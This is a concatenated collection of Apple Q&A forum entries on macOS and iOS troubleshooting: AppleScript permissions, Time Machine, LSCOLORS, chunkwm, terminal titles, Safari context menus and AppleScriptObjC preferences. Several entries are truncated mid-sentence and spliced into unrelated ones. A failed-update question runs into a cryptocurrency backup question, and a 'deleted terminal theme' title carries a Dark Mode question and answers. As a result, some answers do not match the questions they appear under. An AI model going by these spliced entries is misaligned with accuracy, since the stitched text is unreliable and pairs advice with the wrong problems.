I've created a script which uninstalls an application I've created. However, as you may know, in macOS Mojave the system requests the user's permission to allow said script to control System Events. If the user click \"Don't allow\", the script can't be run and the system won't request the user's permission for that app ever again.\nIs there a way to detect if the user has clicked Don't Allow so that, next time the script/app is opened, the user is given instructions on how to allow it to control System Events? (Or even better, request his permission again).\n\nA: Not really.\nThe permission dialog will only be shown once - after that the only options are to change the System Preferences > Security & Privacy > Privacy >  Automation setting (which doesn’t reset the dialog) or reset the privacy database via the tccutil utility (see Apple’s tech note).\nThere is an AEDeterminePermissionToAutomateTarget function to determine if it is authorized to send an Apple Event to an application, but AppleScript can’t use it because it uses a pointer for the target application reference.\nAlso see this blog for a decent writeup about this mess.\n", "Q: \"t\" key always pressed on mac For some reason, my Mac keyboard always thinks that the \"t\" key is always being pressed. However as you can see I can still type in the letter t, but it comes out delayed compared to the other keys. I think it is a software bug as the key still works fine, but on some pages the t key just gets spammed. Oddly enough, shift+t won't give me an uppercase t, but all the other letters work fine (and my caps lock has been converted to a backspace, so I can't test that (by choice)). this has happened before, but typically goes away after a restart, but this one time a restart didn't help. \nEdit: Currently on Macbook Air (1 generation ago)\n\nA: I hate to be the bearer of bad news, but most likely your \"T\" key has a crumb of food or some dust stuck underneath it.\nCanned air sometimes works, but sometimes will jam it in there for good.\nIf it's still under AppleCare, bring it in to an Apple store and look distressed...sometimes it helps to cry a little bit and/or beg. Personally, I just grab a Genius' pant leg and refuse to let go while sobbing loudly.\nGenerally they can replace the key and/or keyboard, but you may need to go without your laptop for a week.\n\nA: Oddly enough, it was actually a software bug. To fix this one must reset the SMC, more information can be found at this link. To reset, one must turn off the computer then hold the shift + control + option key and the power button (all together for 10 seconds). Then turn on the computer as you normally would.\nUpdate: While this mostly worked. I have found that it was still giving me the same problem. Upon further investigation I needed to update ‘Karabiner-Keys’ which is an application that allows you to change the mapping of your keys. A bug in the software was the reason for the spamming of the key at random. Keep your software updated :)\n", "Q: Why and when do Mac laptops start themselves when connected to power? I'm a technician and noticed that, if the battery is disconnected in a Macbook/MacBook Pro: the Mac boots itself when you connect the power adapter.  It sometimes even happens when the battery is connected (after I disconnected and connected it).  What rules this?\n\nA: A Mac laptop will boot itself when power is connected if (a) the firmware power on time has passed since the machine was last running (i.e. if the machine was set to power on at 6 AM every morning and it has been 6 AM since it was last powered on) OR if the machine was on (not shutdown properly) before power was removed.\nThe concept is that if power is lost, a Mac should return to the state it was in.\nIf you want to ensure that the machine does NOT power itself on, \n\n\n*\n\n*In System Preferences -> Energy Saver ->Schedule..., remove any rule that states the machine should power on at a given time.\n\n*Shutdown the machine correctly by selecting \"Shut down...\" from the Apple menu and waiting until it is completely shut down.\n\n\nA: Bill, that’s not really pertinent to what Antonio was asking. Yes, there are rules defining power schedules but his specific query can also be applied to the iPhone, iPad and Apple Watch. Every Apple device powers itself on when it goes from a state of not connected to power to connected to power\nIt’s possible to power an Apple device off when it’s plugged in, but if you unplug it and plug it back in, it will immediately power on. \nThis is clearly something Apple carries with it and seems to be their MO, that a device that’s powered should be able to be worked with immediately. It’s a QoL situation \nI think we can think of this in the same way that closing the lid on a MacBook will always sleep it (without being able to modify this behaviour outside of an Apple like Amphetamine) or closing a Smart Cover on an iPad will immediately put it to sleep. \nMy educated guess is that this is hardwired into the system, if power detected and device = off, turn device on. Again going back to QoL. Apple wants to ensure people have immediate access to their devices and it’s clear they are bypassing checks for batteries. I would be very intrigued to know if this behaviour is reproducible on a device like an iPad/iPhone. I don’t think it would for the watch due to the design, but I’d be interested in knowing the answer for say the iPad. \n", "Q: Get parent of symbolic link instead of original folder I have a project with node_modules folder that contains a symbolic link to another project. The problem that inner project takes configs from parent project (etc ../../../config) and thus cannot find it because of the relative path starting from the original folder instead of a symbolic link. \nExample:\n$ cd ~\n$ mkdir -p a/b/c\n$ ln -s a/b/c d\n$ cd d\n$ ls ../\n\nWill display content of b folder. But I need to display listing of ~ directory. How to do it?\n\nA: Unfortunately, this is not how symbolic links work.  \nFrom the man page (man ln)\n\nThe ln utility creates a new directory entry (linked file) for the\n  file name specified by target_file.  The target_file will be created\n  with the same file modes as the source_file.  It is useful for\n  maintaining multiple copies of a file in many places at once without\n  using up storage for the “copies”; instead, a link “points” to the\n  original copy.\n\nEmphasis mine\nSo, how do you get around this?  Use an environment variable.  For example:\n$ mkdir -p /a/b/c\n$ FOO='/a/b/c'\n$ cd ~\n$ cd $FOO\n$ pwd\n/a/b/c\n\nNote, you should use absolute paths when doing this; using relative paths can and will have unintended consequences.\n", "Q: Is it possible to run Internet Explorer on OS X El Capitan? I need to connect to the website dictate.it, which says it only works with Internet Explorer.\nIs it possible to find versions of IE to run somehow within macOS?\n\nA: You have a few options:\n\n\n*\n\n*VM software and an IEDev image. Microsoft provides free (time-limited) versions of Windows with IE in the form of virtual machine images. You can get them here: https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/\n\n*Install IE using WINE. The WINE project is a Windows compatibility layer for Unix-like systems including macOS. It's free but installing IE can be a pain. You can use tools like Winetricks to make installation easier. Good if you need an earlier version of IE than Microsoft's official solutions provide.\n\n*Change your useragent. In many cases, it used to be that most web browsers would work fine (or at least be operable) on sites optimised for IE only. However, developers couldn't be bothered to support anything outside of IE and would simply put a useragent-based whitelist in place. If you spoof your useragent to be IE, you might still be able to use the site. You can find many extensions for this in Firefox and Chrome/Chromium.\n\n\nA: Buy Parallels, buy Windows, install Parallels, install Windows, and now you can run Windows applications inside MacOSX, including Windows internals like Internet Explorer if I'm not mistaken.\nCosts a few hundred dollars total, but you now have Windows running inside MacOSX and can run most Windows software directly. Some exceptions exist, especially late versions of DirectX and OpenGL aren't supported because of restrictions imposed by OSX (Apple's stonewalling on providing an up to date OpenGL implementation).\n\nA: You can use a virtual machine and then use the images provided by Microsoft for use in testing older versions of IE. Requires no cost and you can delete it when you've finished using the site.\nFor free you can use VirtualBox, and then use one of the images from Microsoft.\n\nA: That last version of Internet Explorer for Mac was released in 2003 & won't run on a modern OS.\nThe closest you can achieve without actually installing Windows would be to change the User Agent in Safari to pretend to be a Windows native browser.\nFrom iMore - How to view websites on your Mac that require Internet Explorer (or a PC)\n\nHow to access websites that require a PC or Internet Explorer\n  \n  \n*\n  \n*Launch Safari.\n  \n*Click Safari in the menu bar at the top of your screen.\n  \n*Click Preferences.\n  \n*Click on the Advanced tab.\n  \n*Check the \"Show Develop menu in menu bar\" setting, then close the Preferences window. The Develop menu should now show in your menu bar.\n  \n*Go to Develop > User Agent.\n  \n*If you need to pretend you're using Internet Explorer, choose one of the Internet Explorer options.\n  \n*If you need to pretend you're using a PC, choose \"Google Chrome — Windows\" or \"Firefox — Windows\".\n  \n\n\nA: First, please note that Internet Explorer has been deprecated and replaced by Microsoft Edge since 2015. It is not known to be a secure browser and has frequent major vulnerabilities. If your service provider doesn't support any modern cross-platform browser (such as Mozilla Firefox or Google Chrome), it may be time for a change of provider or service.\nThat being said, if you really must use Internet Explorer and since it's only available on Windows OS you only have three choices :\n\n*\n\n*Use a Windows PC or install Windows on your Mac using Bootcamp\n\n*Use a virtualization software (VirtualBox, Parallel Desktop or VMware Fusion) to run Windows inside a virtual machine on macOS\n\n*Use a compatibility layer to run windows programs on macOS without virtualization\n\nThat last choice may be a good alternative if you only want to run one specific program and don't need a full-fledged Windows running. Wine is a free and open-source solution capable of running windows program on Unix-like systems (Linux or macOS).\nYou can install and setup Wine manually but it's mostly dedicated for advanced system administrators. However, there are multiple packaged front-ends for Wine that allow running windows program on macOS without much technical knowledge :\n\n*\n\n*PlayOnMac, the Mac version of PlayOnLinux, is a free software and provides a user-friendly graphical interface with configuration templates to run the windows version of Internet Explorer\n\n*CrossOver, a commercial solution with customer support if you have some money to spend. It also provides a graphical interface and may have better support than PlayOnMac.\n\n*Winetricks, another open-source solution but mostly dedicated to advanced users\n\nAlthough those solutions have a lot of benefits (no virtual machine, no Windows license needed, possibly no cost), they may be really tricky to set up if it doesn't work out-of-the-box. In which case a windows virtual machine may still be the easier way to go.\nFYI, I managed to run Internet Explorer 8 on macOS Mojave using the trial version of CrossOver :\n\nIt may very well be the best solution if PlayOnMac doesn't work and you don't have the technical background necessary to setup Wine manually and you don't want to spend ~$200 on a Parallel Desktop + Windows 10 VM solution.\n\nA: You could try to use some of the cloud tools that provide access to browsers via their service.\nEssentially you create an account with one of these services, and through their dashboard you can access a list of browsers that you can control through your own browser.\n\nOne such example would be BrowserStack who have partnered with Microsoft to allow developers to test freely on Edge. They have a free plan which will allow you to access Internet Explorer and get your job done.\nThere are other providers too that you could consider: Sauce Labs, Cross Browser Testing, Browser Ling\n\nDisclaimer: I used to be a BrowserStack employee\n\n", "Q: How do you troubleshoot an iOS app that is not behaving as expected? I downloaded an iOS app named “world history” from the App Store on my iPhone X with the latest firmware. However, whenever I open the app it just open for less than a second and closes immediately. \nThe one thing I can do is to report to the App Store, referring to the developers (if I found them). However, I would like to know if you have some other methods of troubleshooting?\n\nA: The first step is to get in touch with the developer and share your concern. The contact information for the app developer can be found by going to the App Store app, locating the app in question and look for either App Support or Developer Website option. Once on the developer website, you can generally find the contact information.\nIn your message, it helps to mention the version of iOS running on your device and your device model.\nTo further troubleshoot and check if the misbehavior may be happening due to other reasons, it helps to update to the latest public version of iOS. It doesn't hurt to restart the device and try again.\nYou can also try by reinstalling the app, toggling Internet connectivity, logging in/out of Game Center (if it's a game app) etc. to isolate the issue.\nIf you have a different iPhone handy, you can also try by installing the app on it to determine if the issue is device specific.\nIt would help to include your findings in the message that you plan to send the developer.\nSome apps have built-in mechanism to automatically send crash reports to the developer of the app.\nIf everything above fails and you have paid for the app, you can report it to Apple and ask for a full refund. The instructions for the same can be found in this Apple Support article:\n\n\n*\n\n*Request a refund for an App Store or iTunes Store purchase.\n\n", "Q: Dual 4k displays on a Macbook Pro 15\" Late 2013 I would like to get two external monitors for my MacBook Pro 15 Late 2013 running Mojave 10.14.3. Specifically, I'm considering two of the Dell P2415Q 24\" Monitors. I may also keep my MacBook open and use the display as a 3rd monitor.\nUsage is mainly for programming work with some light non-FPS gaming (talking Civilisation, not CS:GO)\n\n\n*\n\n*Will my MacBook be powerful enough to drive this dual 4k monitor setup?\n\n*Can I use MST and daisy chain the two displays from one Thunderbolt port, or would I need to run a separate cable for each display?\n\n*Just generally will it work perfectly fine, or are there potential issues I should be aware of?\n\n\nSimilar questions have been asked before but I feel like there's some conflicting answers (or I just don't understand) and I just want to check before I spend so much money...\n\nA: In reference to your questions about setting up dual 4K displays...\n\nWill my MacBook be powerful enough to drive this dual 4k monitor\n  setup?\n\nNo.  Your MacBook Pro is only capable of supporting 2560x1600 on two external displays.  In other words, it's capable of supporting dual QHD (Quad HD) monitors.\n\nDual display and video mirroring: Simultaneously supports full native\n  resolution on the built-in display and up to 2560 by 1600 pixels on up\n  to two external displays, both at millions of colors\n\nSource:  Apple MacBook Pro 2013 Technical Specifications\nAdditionally, this question/answer is very helpful in determining what displays can be connected and with what resolutions.\n\nCan I use MST and daisy chain the two displays from one thunderbolt\n  port, or would I need to run a separate cable for each display?\n\nYou will need to run a separate cable for each display as  Apple, for whatever reason, chose not to support MST daisy chaining.\n\nJust generally will it work perfectly fine, or are there potential\n  issues I should be aware of?\n\n\"Perfectly fine\" is subjective, but assuming you connect a display independently to different Thunderbolt ports, it should work.  Additionally, it would be beneficial if you used a mDP (mini DisplayPort) to DisplayPort cable and not convert to HDMI.  If you must convert to HDMI, use an active adapter.\n\nA: Actually, it is possible. I have a late 2013 15-inch Macbook pro and can confirm that it works. It may not be possible with the 13\" model, but I've been powering a single 4k monitor for years with it and just hooked up a second one. Both are working fine at full resolution.\n\nA: I can confirm will_durant's post. I bought a good Displayport 1.4 to Mini Displayport cable (supports 8K60hz, HBR3, 32.4Gps). Now I get 3840x2160 with 60 Hz. I have MacOS Big Sur 11.6.7 (no hacks) and the Macbook lid closed (almost, not completely).\nDaisy chaining though is not possible (although I haven't tried it but everyone on the internet says so).\nHere's the section in System Information.app (under Hardware -> Graphics -> Video Card -> NVIDIA GeForce GT 750M):\n27GN950:\n  Resolution:   3840 x 2160 (2160p/4K UHD 1 - Ultra High Definition)\n  UI Looks like:    1920 x 1080 @ 60.00Hz\n\n", "Q: A failed update that resulted in an unmounted disk0s2 During a strange glitch update yesterday I ended up with a circle with a diagonal dash in it .\nI had backed up though .\nI have restarted with command/r \nNow I have attempted to install the a new os version in the many ways available , but my disk is missing ( not visible ) \nWhen I go to reinstall osx mavericks , there is current osx disk available \nWhen in time machine restore , there is also no disk available \nNow I am in disk utility\nI can see a disc0s2 .

I use a cryptocurrency and it's blockchain is represented on disk by a single large lmdb database file.\nThe file is 72GB or so.\nEach day the crypto node updates the chain with new transactions so the file is always getting added to.\nI'm running Time Machine and seeing huge backups.\nI thought Time Machine only backed up deltas of files? (i.e the difference between the old file and new file).\nDoes Time Machine instead backup a file completely, EVERY time it changes by a bit?\nIt seems that way.\nIs time machine so that it will backup a full 70~ gigs a day each time my blockchain db changes slightly?\nThis seems wrong to me.\nWhat do video editors do?? Aren't they always hitting this issue with large video files, 4K and whatnot?\n\nA: Time Machine works on file level, so every time a file changes the full file will be backed up. As you‘ve found out it‘s not well suited for large files with frequent small changes. \nOne way out would be to exclude the directory containing your blockchain file from Time Machine and use rsync to do backups. \n\nA: I know this question is 3+ years old, but I would just point out that locally backing up a blockchain data file is completely pointless. If the working copy ever got corrupted (unlikely in the first place, since a well designed blockchain is constantly syncing and checking its own integrity anyway), the blockchain software should simply re-download and sync the current blockchain from the blockchain node network. As the OP concluded, simply taking that directory out of the Timeshare backup rotation is the correct solution.\n", "Q: I Accidentally Deleted a Stock Terminal Theme I accidentally deleted a stock Apple terminal theme that I'd like to get back.

It turns itself on every day at 19:30 and I have no idea why, or how to turn this feature off.\nWhy is this setting activated and how do I change or edit this?\n\nA: There's no scheduling available for Dark Mode at all. Perhaps you're thinking of Night Shift, found in System Preferences > Displays, which changes the color of the monitor to display warmer colors, which are better at night to minimize the effect of blue light on the production of melatonin.\n\n\nA: There are three System Preferences you have to configure:\n\n\n*\n\n*Enable/Disable Dark Mode (General Preferences)\n\n\n*Enable/Disable Dynamic Desktop Images (Desktop & Screen Savers)\n\n\n*Enable/Disable Night Shift (Display)\n\n", "Q: LSCOLORS format I want to configure my .bash_profile and I've seen this post about BSD based ls configuration:\nhttps://www.cyberciti.biz/faq/apple-mac-osx-terminal-color-ls-output-option/\nI just don't know what is the difference between first directory and the last two (directory) row, or between the executable (5th) row and the 8th and 9th row.\n\nA: What you are comparing here is basically a \"standard\" entity (file/folder) with entities that have special permissions attached:\n\n\n*\n\n*directory (first row), is just that.  A directory (or folder) of other directories and/or files.  These directories all have permissions on who can read/write/execute based on user/group associations.\n\n\n*\n\n*directory writable by others with sticky bit set (10th row) means it's a directory to which users of other groups (than the owner/group) can write to but only the file owner or the root user can modify the file.\n\n*directory writable to others, without sticky (11th row) is also a directory that can be written to by others, but anyone can modify the file.\n\n\n*executable means that a file can by run by the owner or users in the group.\n\n\n*\n\n*executable with setuid bit set (8th row) this is also an executable file, but when the file is run, it will execute with the file owners privileges, not the one running the file.  For example, if a file is owned by root, but run by you, it will execute as if root ran it.\n\n*executable with setgid bit set  (9th row) This is the same as above, except instead of the file's owner, it will be executed with the privileges of the group that owns it (i.e. wheel).\nYou can find more info on the LSCOLORS including a \"color calculator\" on the post https://apple.stackexchange.com/a/282189/119271\n", "Q: 3rd Gen Macbook pro randomly suspends My 3rd Gen (late 2013) MBP randomly suspends.\nI've already seen this and this and this and this. And unfortunately, none of them quite match what's happening to me.\nI will be in the middle of working on my MBP and it will randomly suspend so I have to hit the power button to wake. Pressing the power button resumes from suspend but then it will do it again within a few seconds of use unless I plug it in. Does not seem to necessarily be tied to the remaining battery life (happens more often < 40% but it's happened at 68% and I've gotten down to 5% as recently as this week without seeing the problem).\nThis is a core i7 machine with 16 GB RAM and a 500 GB SSD. Coconut battery reports that I still have 75%+ of the original battery capacity left. This is a machine that otherwise has plenty of life left in it if I can get this resolved.\nAny ideas what could be wrong?\n\nA: Your battery is dying.  It's time to replace it.\nYou have very similar symptoms to the issue in this other post Fully charged MacBook Air turns off when power cord removed, but the major difference is that you have enough \"juice\" to allow macOS to suspend rather than just turn off all at once.\nOne of the biggest factors in batteries dying is it's age.  This is a 2013 MacBook Pro, so it's got 6 years on it.  The average lifepan of a battery is 3 to 5 years so (some last only 2 while some go 6 or 7), you're outside it's usable life.\nBattery utilities\nCoconut Battery, et. al. are neat little tools, however, they can only give a point-in-time calculation of your battery's heath.  It does it by measuring the current (volts and amps) and the current draw.  What it can't do is measure the charge like a fuel gauge in your car.\nThis is why you're seeing the (confusing and conflicting) \"battery's ok but system sleeps when not plugged in\" symptom.\n", "Q: Can a family member use my iPhone, or does Touch ID lock them out on the iPhone SE? Can we bypass TouchID? I'm getting an iPhone SE and wondering if I can let my kids/family members use my phone if they need to?\nI don't know much about Touch ID and am wondering if it can be bypassed, or if I can turn it off so they can use it to call? Also, does Touch ID support multiuser accounts if each person wants their own profile?\n\nA: You can use your device without enabling TouchID/FaceID.\niPhones (and iPads) are designed for a single user. iOS is unfortunately not multiuser. \nWith TouchID, you could train one finger for each person allowed to use the phone, but since there's no concept of separate people, all you'll do is make TouchID less reliable for everyone.\nIf the phone will only be used at home, just don't enable TouchID and be careful not to store any financial or private information on the phone.\n", "Q: Can’t backup OSX Mojave because it thinks FileVault is running I am getting this error on my Mac Mini, which persists after multiple restarts.

So the computer booted in regular mode.

I have a MAC Book pro 15\" built in end of 2014. It has a known issue of anti-reflective coating. I got Apple to replace them twice and I am not sure if they change it again as I entering 5 years soon).\nSince I got new display recently, I am thinking of protecting my display so it does not happen again. \nNow, my question is: \nIs anti-reflective coating of the display better protected under display protection or it fades faster since the screen protector is in direct contact with the coating?\nThanks\n\nA: My understanding is that the problem with the anti-reflective coating is that it slowly delaminates. I.e. the coating simply comes off the screen. The cause of it does not seem to be heat, but rather pressure from outside sources or just time passing.\nIn that light, I don't think a screen protector will protect you against this delamination. Any pressure exerted on the screen protector will also affect the coating. Instead I'm worried that the screen protector will actually make it worse as it will put a (small) weight on the coating at all times.\n", "Q: How to fix CoreStorage not mounting?

It sounds similar to issues posted here and here. I don't know how to go about fixing this and getting that first partition to mount.\n\nA: Your disk 2 doesn't even seem to have a name. It could be something simple - like the name accidentally deleted in Finder - or a serious inability of the OS to read the partition.\nAs you can't mount it without a name, I suppose it will also be difficult to change the name in Finder again, if that is the issue. Sometimes, a disk boots even if it has errors - did you try starting with the alt key? If it works, make sure to name the disk in Finder, preferably with the original name.\nIf that fails, first step is to save all data on the computer which you can still access.\nIf you have a backup of the data you can't access, the easiest solution is to delete the non-working partition and to restore it from the backup. Be aware that this involves a high risk of deleting the whole disk, deleting the wrong disk accidentally and so on. Not to mention that you permanently loose all data if your backup has issues. And you might get an unstable file system if there are still underlying issues.\nIf you have important data and no backups, you might want to consider professional data recovery. That costs some money, but the risk of accidentally loosing all through a wrong diskutil command or such is much lower.\nIf the data is wanted but not important enough to spend so much money on it, the next step is a disk repair app. You install it on a system on another disk (not just another partition) and let it do its magic. With a little bit of luck, all is at least fine enough for making a backup of the data before starting anew.\nIf there is any hardware issue at the root of your problem or coincidentally with your disk, anything you do, even if you make no mistakes, can end your disk (not just your partition).\nIf the disk repair app doesn't work or you don't want to spend the money, you may try a few terminal commands for renaming the partition. I'm not sure whether renaming works in terminal or whether this deletes the partition. And I'm not sure whether diskutil or diskutil cs commands are needed for that - try either, and preferably with the original name, if you remember it. A restart and it might or might not work.\nI assume you already tried all repair options in Disk Utility and with the diskutil command. If renaming works but doesn't resolve the issue, try them again.\nI don't see any more options right now.\n", "Q: Why does chunkwm fail with \"Permission denied\" error for .chunkwmrc ashleyharvey@Themis:~$ ls -al .chunkwmrc\n-rw------- 2 ashleyharvey staff 4.7K Apr  4 22:24 .chunkwmrc\nashleyharvey@Themis:~$ chunkwm\n/bin/bash: /Users/ashleyharvey/.chunkwmrc: Permission denied\n\nSo, chunkwm is running obviously under a different uid than my own.  One way to fix this would be to give a wider set of permissions: I could chmod 640 or chmod 644 the file; however my question is how to figure out which uid/gid a process runs as in order to fix that while maintaining as tight a security boundary as possible.\nI did find an answer on the unix stackexchange site that had to do with running stat on a process, so I tried something along the lines of $ (stat /proc/$$/), but apparently because of the difference in the macOS kernel, that won't work.  I ended up in /dev, but only found fd's for the standard in/out and a bunch of special stuff, clearly that's not where process FDs go.\nEDIT2:\nMore relevant info on chunkwm:\nashleyharvey@Themis:~$ ls -al /usr/local/opt/chunkwm/bin/chunkwm` \n-r-xr-xr-x 1 ashleyharvey admin 207K Mar  7 21:55 /usr/local/opt/chunkwm/bin/chunkwm\n\nashleyharvey@Themis:~$ ps aux | grep chunkwm` \nashleyharvey     15153   0.0  0.1  4375940  20508   ??

The error message does not mean that the user does not have permission to read the .chunkwmrc file - instead it means that the user does not have permission to execute the file.\nThe configuration file for chunkwm (.chunkwmrc) is actually a shell script that is run with bash (in your case). Therefore it needs to be executable. \nYou have set the permissions so that it is not executable, and that's why it fails. You need to run the following command:\nchmod +x ~/.chunkwmrc\n\nThis will set the executable bit so that you are allowed to execute the file.\nTo answer your other questions about determining current uid for a process - the easiest way to do that is run the following command in Terminal:\nps xau | grep chunkwm\n\nYou'll see the username (or uid) as the first column of the result.\nThe /proc file system is Linux specific and doesn't exist in macOS (nor in many other operating systems). That's why the commands you have found regarding /proc do not work for you.\nThe /dev directory holds device nodes. macOS does not create device nodes for each running process that could give the uid of the running process. This is similar to other operating systems such as Linux, FreeBSD, etc. as this is simply not how /dev is meant to be used.\nAll in all remember that your specific problem here had nothing to do with uid's being changed, so there was no reason to lookup the uid's or trying to \"stop\" them being changed.\n", "Q: Should I worry that TimeMachine is making many backups during one night without me using my computer? When I want TimeMachine to backup my computer, I usually plug my external hard drive before going to bed.\nUnfortunately, I am already in the position where new backups are replacing old ones on the drive.\nSo I am quite worried when I see that TimeMachine is creating many different snapshots during the night.\nAre these identical backups going to affect the oldest ones on my drive?\nOr since they are identical, TimeMachine does not remove an old snapshot everytime it creates a new one?\nI am a bit confused and would like to know if I need to change my backing up routine, like doing it at the same time as I am behind the computer, to be able to unplug the drive right after?\nThanks.\n\nA: It is completely natural for Time Machine to keep backing up when noone is using the computer.\nUsually those backups will contains almost no changes, and thus they take up almost no space on the external drive because only changes are backed up. They will eventually push out old backups, but it will probably take a long while because the changes are so small.\nEven when not using the computer, there are constantly made small changes to log files, etc. that are transferred over. However note that some virtualisation programs for running Windows, Linux, etc. on the Mac can cause relatively large backups to be made even when almost no user visible changes have been made inside the virtual machine.\n", "Q: How can I make sure that the title of a Terminal tab/window is identical to the command I typed I noticed that for aliases etc the title of a Terminal tab/window often isn't the same as the command I typed. This is sometimes confusing, especially for long-running processes with similar names.\nSo how can I configure bash/Terminal in a way which ensures that the window title always reflects the command as typed?\nExamples:\n\n\n*\n\n*When I type python -m SimpleHTTPServer and press Return in a Terminal window, the tab of that Terminal window should show \"python -m SimpleHTTPServer\" immediately.\n\n*When I type flushdns, which is my alias for sudo killall -HUP mDNSResponder;sudo killall mDNSResponderHelper;sudo dscacheutil -flushcache and press Return in a Terminal window, the tab of that Terminal window should show \"flushdns\" immediately.\nWhat I tried:\nI tried modifying PS4 to run a command. This works, however it also prints a lot of other garbage, like getting the current git branch and other commands I put in my PS1. If there's a way for PS4 to only run scripts and not output anything (not even line breaks) I'm fine with that too as a solution.\nI also tried the various options under Preferences > Profiles > Tab, but it does not allow showing the literal command I just entered.\n\nA: macOS Catalina (10.15) now uses Zsh, which makes this really easy.\nShow the currently running / last run command by disabling auto_title and adding a preexec hook:\n# File: ~/.zshrc\n\nDISABLE_AUTO_TITLE=\"true\"\n\npreexec() {\n    printf \"\\e]1;${1}\\a\"\n}\n\n\nA: Open a Terminal window and go to preferences. Click on Profiles and select Window from the pane, In the Window pane there is an option to show active process name. Check that box and the one under it that says arguments. See image below.\n\n", "Q: Keep iPhone and iCloud Photos In-Sync Is it possible to keep the photos on the iPhone and iCloud in-sync? So if I delete a photo on the iPhone, I want it to be deleted on iCloud and vice versa.\nIs it possible to configure the phone/cloud to do this?\n\nA: Yes, if you enable iCloud Photos on the iPhone, your iCloud photo library and the iPhone's photo library will automatically be synchronized. Then if you delete a photo on the iPhone, the same photo in the iCloud library will automatically be deleted.\nYou'll find the guide for turning on iCloud Photos here:\nhttps://support.apple.com/en-gb/HT204264\n", "Q: Can I prevent websites from disabling the context menu in Safari on macOS? More and more websites seem to disable the context menu in web browsers.\nCan I prevent websites from disabling the context menu in Safari on macOS?\n\nA: I finally found a tool that brings back the context menu for Safari on all those websites that disable it. It’s aptly called StopTheMadness ($8.99).\nIt also offers solutions for other browsers like Firefox, but I haven’t tested those.\n\nMany web sites disable user interface features in your browser that you normally expect to work. StopTheMadness ensures that those features continue to work for you in Safari and Firefox:\n\n\nA: Hateful 'web designers' absue their privilege to run code on our machines that restricts our tools and workflows. To get around this offensive behaviour by evil people, they should pay us damages. Not we should pay to get back to simply standard behaviour.\nAlternatives to paying this hostage money for standard behaviour of our browsers would be found in some cases by disabling JavaScript completely or with more granularity. But that doesn't always work.\nSome free extensions for Safari that re-enable standard  workflows and rightclick behaviour would be:\nRightClick:\n\nThis is a native Safari extension.\n\"Right Click\" re-enables right click, select and copy on web sites.\n  You can use the context menu, select and copy on websites which disable those functions when you need. ( 1.0.3, OS X 10.11.5 or later, 64-bit processor, Mar 1, 2019, Price: Free)\n\nSmart Right Click: \n\nhttps://safari-extensions.apple.com/details/?id=cf.mattijs.smartrightclick-7G36RSR4E4\n  Enables the right click menu everywhere. Detects what you’re trying to right click and temporarily disables any elements in the way.\n  This means you'll be able to enter picture in picture mode with any video, download most images / videos and whatever else the right click menu usually has to offer.\n\nUltimately, Apple has to disable the ability of 'designers' to cripple Safari at the root completely. We should write that into our feedback forms we send to Apple.\n", "Q: Cannot create bootable USB with Boot Camp, \"there is not enough space available on the disk\" I am trying to install Windows 10 on my MacBook (macOS Mojave 14.4.4).

Problem\nApparently with the security changes made in Mojave and now going forward, I lost the ability to store globals between invocations of my scripts. \nAll that I want to do is to toggle states of connections based on my location (e.g. work versus home toggles ethernet versus WiFi and other stuff). I want to store the state for the next time so that I can know what the setting had been.\nI don't do XCode development (I do however program in other languages such as python). Everything for AppleScript is in ScriptEditor (perhaps soon Script Debugger instead). Finally, I am conversant enough to know how to write the scripts and save them as applications. Anything else that I need to use would hopefully be at a \"plug-and-play\" level of effort.\nExample Script\nHere is an example of a script that I use to toggle the status between presentations and no presentations.

This prompts me to ask a follow up based on a question from two years ago posted at this link.\nAppleScript alternatives\nIn a nutshell, where do programmers go to find resources about the newest practices to write robust scripts with AppleScript?\nI stumbled across the site for Script Debugger while subsequently looking for \"applescript globals\". The site offered some insights. I would be hard pressed to read all of the forum posts to cull the information that I need laid out in a tutorial + example manner. But if this is the current practice, so be it.\n\nA: Saving Application Preferences\nSince a regular AppleScript saves properties and globals in the script file, code signing or making script(s) read-only prevents problems with privacy accessibility settings due to applications being modified, but this prevents the historical use of persistent properties.\nA solution would be to use NSUserDefaults (which is the way regular applications handle preferences), either directly using AppleScriptObjC or via something like the PrefsStorageLib library.  Either one will save items in ~/Library/Preferences/ under your script application’s bundle identifier.  In general, you do something like:\n\n\n*\n\n*define properties for your preference items with initial starting values\n\n*register your preference items with the user defaults (this sets up a default item store)\n\n*read your preference items (this will update items from the application’s preferences.plist, if any, or use the default)\n\n*do your application stuff\n\n*save your preference items before quitting\n\n\nIn your project, add the following to the beginning of the script to declare the frameworks used:\nuse AppleScript version \"2.4\" -- Yosemite (10.10) or later\nuse framework \"Foundation\"\nuse scripting additions\n\nAdd a couple of handlers for the defaults stuff (I'm using your pCurrentMode property with a preference key of \"CurrentMode\"):\non getDefaults() -- register and read any previously saved preferences\n  tell standardUserDefaults() of current application's NSUserDefaults\n    registerDefaults_({CurrentMode:pCurrentMode})\n    set pCurrentMode to objectForKey_(\"CurrentMode\") as text\n  end tell\nend getDefaults\n\non saveDefaults() -- update the preferences\n  tell standardUserDefaults() of current application's NSUserDefaults\n    setObject_forKey_(pCurrentMode, \"CurrentMode\")\n  end tell\nend saveDefaults\n\nThen call getDefaults() at the beginning of your run handler, and saveDefaults() at the end (so that the pCurrentMode preference is only updated when the script runs to completion).  Save the script as an application (without the \"Stay open\" option) and give it a unique bundle identifier (there should be a Bundle Contents toolbar item after saving that will give you easy access).\nFinding Current AppleScript Resources\nOther than a few blog posts about the new security measures, MacScripter / Script Debugger forums and Stack Overflow are pretty much the only places you are going to find anything current.\nThere are a few classic AppleScript books such as AppleScript: The Definitive Guide and Apple Training Series: AppleScript 1-2-3, but they aren’t current.  There just doesn’t seem to be enough of a market - even the current Apple documentation has been archived.  For AppleScriptObjC, there never was a whole lot other than Shane Stanley's contributions such as Everyday AppleScriptObjC and the earlier AppleScriptObjC Explored.  Apple’s intent would seem to be for you to use their current Cocoa documentation and convert it if you happen to be using something else.\nAppleScript documentation has almost never been kept up to date (even the AppleScriptObjC Release Notes is essentially a single page from 2009), but the current AppleScript Language Guide (2016), even though it has been archived, is still relevant, since the language itself hasn’t changed all that much.\n", "Q: How do I download a macOS beta point update?

The macOS Developer Beta Access Utility just starts the update process on the machine it runs on.\n\nA: I'm sorry, you're question is still a bit confusing to me, but I'll take a stab at it:\nYour best bet is probably to comb through the listings you'll find in the Software Update catalogs found in Seeding.framework.

